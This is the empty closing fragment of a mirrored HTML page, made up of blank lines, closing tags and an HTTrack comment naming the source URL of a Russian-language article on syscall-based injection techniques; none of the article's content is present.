	

				
			
		
		
	

</body>

<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:42:32 GMT -->
</html>









